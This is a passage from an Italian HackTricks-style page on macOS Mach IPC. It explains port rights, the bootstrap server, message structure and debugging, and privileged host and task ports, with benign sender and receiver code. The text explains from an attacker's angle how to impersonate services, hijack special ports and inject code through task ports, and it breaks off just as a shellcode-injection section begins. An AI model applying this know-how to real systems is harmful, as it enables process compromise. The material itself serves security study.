# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Informazioni di base

Mach utilizza i **task** come **unità più piccola** per la condivisione delle risorse, e ogni task può contenere **più thread**. Questi **task e thread sono mappati 1:1 rispettivamente ai processi e ai thread POSIX**.

La comunicazione tra task avviene tramite la Mach Inter-Process Communication (IPC), utilizzando canali di comunicazione unidirezionali. **I messaggi vengono trasferiti tra le porte**, che funzionano in qualche modo come **code di messaggi** gestite dal kernel.

Una **porta** è l'elemento **di base** della Mach IPC. Può essere utilizzata per **inviare e ricevere** messaggi.

Ogni processo possiede una **tabella IPC**, nella quale è possibile trovare le **mach port del processo**. Il nome di una mach port è in realtà un numero (un puntatore all'oggetto del kernel).

Un processo può anche inviare il nome di una porta con alcuni diritti **a un task diverso** e il kernel farà apparire questa voce nella **tabella IPC dell'altro task**.

### Diritti delle porte

I diritti delle porte, che definiscono quali operazioni può eseguire un task, sono fondamentali per questa comunicazione. I possibili **diritti delle porte** sono ([definizioni disponibili qui](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):<sup>[[1]](#references)</sup>

- **Receive right**, che consente di ricevere i messaggi inviati alla porta. Le Mach port sono code MPSC (multiple-producer, single-consumer), il che significa che nell'intero sistema può esistere **un solo receive right per ogni porta** (a differenza delle pipe, in cui più processi possono possedere file descriptor per l'estremità di lettura della stessa pipe).
- Un **task con il Receive right** può ricevere messaggi e **creare Send rights**, consentendogli di inviare messaggi. In origine solo il **task proprietario possiede il Receive right sulla propria porta**.
- Se il proprietario del Receive right **muore** o lo termina, il **send right diventa inutilizzabile (dead name)**.
- **Send right**, che consente di inviare messaggi alla porta.
- Il Send right può essere **clonato**, quindi un task che possiede un Send right può clonare il diritto e **concederlo a un terzo task**.
- Si noti che i **port rights** possono anche essere **passati** tramite messaggi Mach.
- **Send-once right**, che consente di inviare un messaggio alla porta e poi scompare.
- Questo diritto **non può essere** **clonato**, ma può essere **spostato**.
- **Port set right**, che indica un _port set_ invece di una singola porta. Estrarre un messaggio da un port set significa estrarre un messaggio da una delle porte che contiene. I port set possono essere utilizzati per ascoltare contemporaneamente su più porte, in modo molto simile a `select`/`poll`/`epoll`/`kqueue` in Unix.
- **Dead name**, che non è un vero diritto della porta, ma solo un segnaposto. Quando una porta viene distrutta, tutti i diritti esistenti sulla porta si trasformano in dead name.

**I task possono trasferire i SEND rights ad altri**, consentendo loro di inviare messaggi di risposta. I **SEND rights possono anche essere clonati, quindi un task può duplicare e concedere il diritto a un terzo task**. Questo, insieme a un processo intermediario noto come **bootstrap server**, consente una comunicazione efficace tra i task.

### File Ports

Le file port consentono di incapsulare file descriptor in Mach port (utilizzando i Mach port rights). È possibile creare una `fileport` da un determinato file descriptor con `fileport_makeport` e creare un file descriptor da una `fileport` con `fileport_makefd`.

### Stabilire una comunicazione

Come menzionato in precedenza, è possibile inviare diritti utilizzando messaggi Mach; tuttavia, **non è possibile inviare un diritto senza possedere già un diritto** per inviare un messaggio Mach. Quindi, come viene stabilita la prima comunicazione?

A questo scopo è coinvolto il **bootstrap server** (**launchd** su macOS): poiché **chiunque può ottenere un SEND right per il bootstrap server**, è possibile chiedergli un diritto per inviare un messaggio a un altro processo:

1. Il task **A** crea una **nuova porta**, ottenendo il **RECEIVE right** su di essa.
2. Il task **A**, essendo il titolare del RECEIVE right, **genera un SEND right per la porta**.
3. Il task **A** stabilisce una **connessione** con il **bootstrap server** e gli **invia il SEND right** per la porta generata all'inizio.
- Ricorda che chiunque può ottenere un SEND right per il bootstrap server.
4. Il task A invia un messaggio `bootstrap_register` al bootstrap server per **associare la porta fornita a un nome** come `com.apple.taska`
5. Il task **B** interagisce con il **bootstrap server** per eseguire un **lookup** bootstrap del nome del servizio (`bootstrap_lookup`). Affinché il bootstrap server possa rispondere, il task B gli invia un **SEND right per una porta creata in precedenza** all'interno del messaggio di lookup. Se il lookup ha esito positivo, il **server duplica il SEND right** ricevuto dal Task A e lo **trasmette al Task B**.
- Ricorda che chiunque può ottenere un SEND right per il bootstrap server.
6. Con questo SEND right, il **Task B** è in grado di **inviare** un **messaggio** **al Task A**.
7. Per una comunicazione bidirezionale, solitamente il task **B** genera una nuova porta con un **RECEIVE right** e un **SEND right**, e fornisce il **SEND right al Task A**, così che possa inviare messaggi al TASK B (comunicazione bidirezionale).

Il bootstrap server **non può autenticare** il nome del servizio dichiarato da un task. Ciò significa che un **task** potrebbe potenzialmente **impersonare qualsiasi task di sistema**, ad esempio **dichiarando falsamente il nome di un servizio di autorizzazione** e approvando quindi ogni richiesta.

Apple memorizza quindi i **nomi dei servizi forniti dal sistema** in file di configurazione sicuri, situati in directory **protette da SIP**: `/System/Library/LaunchDaemons` e `/System/Library/LaunchAgents`. Insieme a ciascun nome del servizio viene memorizzato anche il **binary associato**. Il bootstrap server creerà e manterrà un **RECEIVE right per ciascuno di questi nomi di servizio**.

Per questi servizi predefiniti, il processo di **lookup** è leggermente diverso. Quando viene effettuato il lookup di un nome di servizio, launchd avvia dinamicamente il servizio. Il nuovo workflow è il seguente:

- Il task **B** avvia un **lookup** bootstrap per un nome di servizio.
- **launchd** verifica se il task è in esecuzione e, se non lo è, lo **avvia**.
- Il task **A** (il servizio) esegue un **bootstrap check-in** (`bootstrap_check_in()`). In questo caso, il server **bootstrap** crea un SEND right, lo conserva e **trasferisce il RECEIVE right al Task A**.
- launchd duplica il **SEND right e lo invia al Task B**.
- Il **Task B** genera una nuova porta con un **RECEIVE right** e un **SEND right**, e fornisce il **SEND right al Task A** (il servizio), affinché possa inviare messaggi al TASK B (comunicazione bidirezionale).

Tuttavia, questo processo si applica solo ai task di sistema predefiniti. I task non di sistema continuano a operare come descritto originariamente, il che potrebbe potenzialmente consentire l'impersonation.

> [!CAUTION]
> Pertanto, launchd non dovrebbe mai andare in crash, altrimenti l'intero sistema andrà in crash.

### Un messaggio Mach

[Ulteriori informazioni sono disponibili qui](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)<sup>[[4]](#references)</sup>

La funzione `mach_msg`, essenzialmente una system call, viene utilizzata per inviare e ricevere messaggi Mach. La funzione richiede il messaggio da inviare come argomento iniziale. Questo messaggio deve iniziare con una struttura `mach_msg_header_t`, seguita dal contenuto effettivo del messaggio. La struttura è definita come segue:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
I processi che possiedono un _**receive right**_ possono ricevere messaggi su una porta Mach. Al contrario, ai **senders** viene assegnato un _**send**_ o un _**send-once right**_. Il send-once right serve esclusivamente per inviare un singolo messaggio, dopodiché diventa invalido.<sup>[[11]](#references)</sup>

Il campo iniziale **`msgh_bits`** è una bitmap:

- Il primo bit (il più significativo) viene utilizzato per indicare che un messaggio è complesso (ulteriori informazioni più avanti)
- Il 3° e il 4° sono utilizzati dal kernel
- I **5 bit meno significativi del 2° byte** possono essere utilizzati per il **voucher**: un altro tipo di porta per inviare combinazioni chiave/valore.
- I **5 bit meno significativi del 3° byte** possono essere utilizzati per la **local port**
- I **5 bit meno significativi del 4° byte** possono essere utilizzati per la **remote port**

I tipi che possono essere specificati nelle porte voucher, local e remote sono (da [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Ad esempio, `MACH_MSG_TYPE_MAKE_SEND_ONCE` può essere usato per **indicare** che un **send-once** **right** deve essere derivato e trasferito per questa porta. È inoltre possibile specificare `MACH_PORT_NULL` per impedire al destinatario di poter rispondere.

Per ottenere una **bi-directional communication** semplice, un processo può specificare una **mach port** nell'**header** del messaggio mach chiamata _reply port_ (**`msgh_local_port`**), sulla quale il **receiver** del messaggio può **send a reply** a questo messaggio.

> [!TIP]
> Nota che questo tipo di bi-directional communication viene usato nei messaggi XPC che prevedono una risposta (`xpc_connection_send_message_with_reply` e `xpc_connection_send_message_with_reply_sync`). Tuttavia, **solitamente vengono create porte diverse**, come spiegato in precedenza, per creare la bi-directional communication.

Gli altri campi dell'header del messaggio sono:

- `msgh_size`: la dimensione dell'intero packet.
- `msgh_remote_port`: la porta sulla quale viene inviato questo messaggio.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: l'ID di questo messaggio, che viene interpretato dal receiver.

> [!CAUTION]
> Nota che i **mach messages vengono inviati attraverso una `mach port`**, che è un canale di comunicazione **single receiver**, **multiple sender** integrato nel kernel mach. **Più processi** possono **inviare messaggi** a una mach port, ma in qualsiasi momento solo **un singolo processo può leggere** da essa.

I messaggi sono quindi formati dall'header **`mach_msg_header_t`**, seguito dal **body** e dal **trailer** (se presente), e possono concedere il permesso di rispondere. In questi casi, il kernel deve soltanto passare il messaggio da un task all'altro.

Un **trailer** è un'**informazione aggiunta dal kernel al messaggio** (non può essere impostata dall'utente), che può essere richiesta durante la ricezione del messaggio tramite i flag `MACH_RCV_TRAILER_<trailer_opt>` (è possibile richiedere informazioni diverse).

#### Complex Messages

Tuttavia, esistono altri messaggi più **complessi**, come quelli che trasferiscono port rights aggiuntivi o condividono memoria, per i quali il kernel deve anche inviare questi oggetti al destinatario. In questi casi, il bit più significativo dell'header `msgh_bits` viene impostato.

I descrittori possibili da trasferire sono definiti in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
In 32 bit, tutti i descriptor sono di 12B e il tipo di descriptor si trova nell'undicesimo. In 64 bit, le dimensioni variano.

> [!CAUTION]
> Il kernel copierà i descriptor da un task all'altro, ma prima **creando una copia nella memoria del kernel**. Questa tecnica, conosciuta come "Feng Shui", è stata abusata in diversi exploit per fare in modo che il **kernel copi i dati nella propria memoria**, facendo sì che un processo invii descriptor a se stesso. Il processo può quindi ricevere i messaggi (il kernel li libererà).
>
> È anche possibile **inviare port rights a un processo vulnerabile**, e i port rights appariranno semplicemente nel processo (anche se non li sta gestendo).

### Mac Ports APIs

Nota che le porte sono associate al namespace del task, quindi, per creare o cercare una porta, viene interrogato anche il namespace del task (ulteriori informazioni in `mach/mach_port.h`):<sup>[[6]](#references)</sup>

- **`mach_port_allocate` | `mach_port_construct`**: **Crea** una porta.
- `mach_port_allocate` può anche creare un **port set**: un receive right su un gruppo di porte. Ogni volta che viene ricevuto un messaggio, viene indicata la porta da cui proviene.
- `mach_port_allocate_name`: Modifica il nome della porta (per impostazione predefinita, un intero a 32 bit)
- `mach_port_names`: Recupera i nomi delle porte da un target
- `mach_port_type`: Recupera i rights di un task su un nome
- `mach_port_rename`: Rinomina una porta (come `dup2` per i FD)
- `mach_port_allocate`: Alloca un nuovo RECEIVE, PORT_SET o DEAD_NAME
- `mach_port_insert_right`: Crea un nuovo right in una porta sulla quale si dispone di RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Funzioni utilizzate per **inviare e ricevere messaggi Mach**. La versione overwrite consente di specificare un buffer diverso per la ricezione dei messaggi (l'altra versione lo riutilizza semplicemente).

### Debug mach_msg

Poiché le funzioni **`mach_msg`** e **`mach_msg_overwrite`** sono quelle utilizzate per inviare e ricevere messaggi, impostare un breakpoint su di esse consentirebbe di esaminare i messaggi inviati e ricevuti.

Ad esempio, avvia il debugging di qualsiasi applicazione di cui tu possa eseguire il debug, poiché caricherà **`libSystem.B` che utilizzerà questa funzione**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Per ottenere gli argomenti di **`mach_msg`**, controlla i registri. Questi sono gli argomenti (da [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Recupera i valori dai registri:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Esamina l'intestazione del messaggio controllando il primo argomento:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Quel tipo di `mach_msg_bits_t` è molto comune per consentire una risposta.

### Enumerazione delle porte
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Il **name** è il nome predefinito assegnato alla porta (nota come sta **aumentando** nei primi 3 byte). L’**`ipc-object`** è l’**identifier** univoco **offuscato** della porta.\
Nota inoltre come le porte con il solo permesso **`send`** **identificano il proprietario** (nome della porta + pid).\
Nota anche l’uso di **`+`** per indicare **altri task connessi alla stessa porta**.

È anche possibile usare [**procesxp**](https://www.newosxbook.com/tools/procexp.html) per visualizzare anche i **nomi dei servizi registrati** (con SIP disabilitato a causa della necessità di `com.apple.system-task-port`):
```
procesp 1 ports
```
Puoi installare questo tool su iOS scaricandolo da [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Esempio di codice

Nota come il **mittente** **alloca** una porta, crea un **send right** per il nome `org.darlinghq.example` e lo invia al **bootstrap server**, mentre il mittente richiede il **send right** di quel nome e lo usa per **inviare un messaggio**.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Privileged Ports

Alcune porte speciali consentono a un task di **eseguire determinate azioni sensibili o accedere a determinati dati sensibili** quando dispone dei diritti **SEND** su di esse. Queste porte sono interessanti dal punto di vista di un attaccante sia per le loro capacità sia per la possibilità di **condividere i diritti SEND tra i task**.

### Host Special Ports

Queste porte sono rappresentate da un numero.

I diritti **SEND** possono essere ottenuti chiamando **`host_get_special_port`**, mentre i diritti **RECEIVE** chiamando **`host_set_special_port`**. Tuttavia, entrambe le chiamate richiedono la porta **`host_priv`**, alla quale solo root può accedere. Inoltre, in passato root poteva chiamare **`host_set_special_port`** e dirottare porte arbitrarie, consentendo ad esempio di bypassare le firme del codice dirottando `HOST_KEXTD_PORT` (ora SIP lo impedisce).

Queste sono divise in 2 gruppi: le **prime 7 porte sono di proprietà del kernel**: la 1 è `HOST_PORT`, la 2 è `HOST_PRIV_PORT`, la 3 è `HOST_IO_MASTER_PORT` e la 7 è `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Quelle che iniziano **dal** numero **8** sono **di proprietà dei system daemon** e possono essere trovate dichiarate in [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Host port**: se un processo dispone del privilegio **SEND** su questa porta, può ottenere **informazioni** sul **sistema** chiamando le sue routine, come:
- `host_processor_info`: ottiene informazioni sul processore
- `host_info`: ottiene informazioni sull'host
- `host_virtual_physical_table_info`: tabella delle pagine virtuali/fisiche (richiede MACH_VMDEBUG)
- `host_statistics`: ottiene statistiche sull'host
- `mach_memory_info`: ottiene il layout della memoria del kernel
- **Host Priv port**: un processo con il diritto **SEND** su questa porta può eseguire **azioni privilegiate**, come mostrare i dati di boot o tentare di caricare un'estensione del kernel. Il **processo deve essere root** per ottenere questo permesso.
- Inoltre, per chiamare l'API **`kext_request`** sono necessari altri entitlement **`com.apple.private.kext*`**, concessi soltanto ai binari Apple.
- Altre routine che possono essere chiamate sono:
- `host_get_boot_info`: ottiene `machine_boot_info()`
- `host_priv_statistics`: ottiene statistiche privilegiate
- `vm_allocate_cpm`: alloca memoria fisica contigua
- `host_processors`: diritto SEND ai processori dell'host
- `mach_vm_wire`: rende la memoria residente
- Poiché **root** può accedere a questo permesso, può chiamare `host_set_[special/exception]_port[s]` per **dirottare le porte speciali o di eccezione dell'host**.

È possibile **visualizzare tutte le porte speciali dell'host** eseguendo:
```bash
procexp all ports | grep "HSP"
```
### Porte speciali dei task

Queste sono porte riservate a servizi noti. È possibile ottenerle/impostarle chiamando `task_[get/set]_special_port`. Si trovano in `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [qui](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):<sup>[[8]](#references)</sup>

- **TASK_KERNEL_PORT**\[task-self send right]: La port utilizzata per controllare questo task. Utilizzata per inviare messaggi che influiscono sul task. È la port restituita da **mach_task_self (vedere Task Ports sotto)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: La bootstrap port del task. Utilizzata per inviare messaggi che richiedono la restituzione delle port di altri servizi di sistema.
- **TASK_HOST_NAME_PORT**\[host-self send right]: La port utilizzata per richiedere informazioni sull'host contenitore. È la port restituita da **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: La port che identifica la sorgente da cui questo task attinge la propria memoria wired del kernel.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: La port che identifica la sorgente da cui questo task attinge la propria memoria predefinita gestita.

### Task Ports

Originariamente Mach non aveva i "processi", ma i "task", considerati più come contenitori di thread. Quando Mach è stato integrato con BSD, **ogni task è stato associato a un processo BSD**. Pertanto, ogni processo BSD contiene i dettagli necessari per essere un processo e ogni task Mach dispone anche dei propri meccanismi interni, ad eccezione dell'inesistente pid 0, che è il `kernel_task`.

Esistono due funzioni molto interessanti relative a questo:<sup>[[7]](#references)</sup>

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Ottiene un SEND right per la port del task relativo al task specificato dal `pid` e lo assegna alla `target_task_port` indicata, che di solito è il task chiamante che ha utilizzato `mach_task_self()`, ma potrebbe essere una SEND port su un task diverso.
- `pid_for_task(task, &pid)`: Data una SEND right a un task, individua a quale PID è associato quel task.

Per eseguire azioni all'interno del task, il task aveva bisogno di una `SEND` right verso se stesso chiamando `mach_task_self()`, che utilizza `task_self_trap` (28). Con questo permesso, un task può eseguire diverse azioni, come:

- `task_threads`: Ottiene una SEND right su tutte le task port dei thread del task
- `task_info`: Ottiene informazioni su un task
- `task_suspend/resume`: Sospende o riprende un task
- `task_[get/set]_special_port`
- `thread_create`: Crea un thread
- `task_[get/set]_state`: Controlla lo stato del task
- e altro ancora, disponibile in [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Nota che, con una SEND right sulla task port di un **task diverso**, è possibile eseguire tali azioni su un task differente.

Inoltre, la task port è anche la port **`vm_map`**, che consente a un chiamante di **leggere e manipolare la memoria** all'interno di un task con funzioni come `vm_read()` e `vm_write()`. Ciò significa che un task con SEND rights sulla task port di un altro task può **iniettare codice in quel task**.

Ricorda che, poiché anche il **kernel è un task**, se qualcuno riesce a ottenere **SEND permissions** sul **`kernel_task`**, potrà fare eseguire qualsiasi cosa al kernel (jailbreak).

- Chiama `mach_task_self()` per **ottenere il nome** di questa port per il task chiamante. Questa port viene solo **ereditata** attraverso **`exec()`**; un nuovo task creato con `fork()` ottiene una nuova task port, ad eccezione del caso particolare in cui un task ottiene anch'esso una nuova task port dopo `exec()`in un binario suid. L'unico modo per creare un task e ottenere la relativa port consiste nell'eseguire la ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) durante un `fork()`.
- Queste sono le restrizioni per accedere alla port (da `macos_task_policy` del binario `AppleMobileFileIntegrity`):
- Se l'app dispone dell'entitlement **`com.apple.security.get-task-allow`**, i processi dello **stesso utente possono accedere alla task port** (generalmente aggiunto da Xcode per il debugging). Il processo di **notarization** non lo consentirà nelle release di produzione.
- Le app con l'entitlement **`com.apple.system-task-ports`** possono ottenere la **task port di qualsiasi** processo, ad eccezione del kernel. Nelle versioni precedenti era chiamato **`task_for_pid-allow`**. Viene concesso solo alle applicazioni Apple.
- **Root può accedere alle task port** delle applicazioni **non** compilate con un runtime **hardened** (e non provenienti da Apple).

**La task name port:** Una versione non privilegiata della _task port_. Fa riferimento al task, ma non ne consente il controllo. L'unica operazione che sembra essere disponibile attraverso di essa è `task_info()`.

### Thread Ports

Anche i thread hanno port associate, visibili dal task che chiama **`task_threads`** e dal processore tramite `processor_set_threads`. Una SEND right sulla thread port consente di utilizzare le funzioni del sottosistema `thread_act`, come:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Qualsiasi thread può ottenere questa port chiamando **`mach_thread_sef`**.

### Shellcode Injection in thread via Task port

Puoi ottenere una shellcode da:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
